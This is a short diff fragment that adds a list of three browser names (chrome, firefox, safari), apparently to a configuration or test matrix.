+    - chrome
+    - firefox
+    - safari
+
